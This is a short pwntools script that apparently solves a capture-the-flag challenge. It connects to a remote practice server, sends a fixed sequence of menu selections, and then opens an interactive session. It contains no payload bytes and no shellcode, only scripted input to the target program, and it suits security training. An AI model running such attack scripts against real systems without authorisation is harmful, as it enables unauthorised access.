from pwn import *

p = remote('node4.buuoj.cn', 26383)
p.recv()
p.sendline(b'1')
p.sendline(b'2')
p.sendline(b'1')
p.sendline(b'2')
p.sendline(b'1')
p.sendline(b'1')
p.sendline(b'3')
p.sendline(b'1')
p.sendline(b'3')
p.interactive()

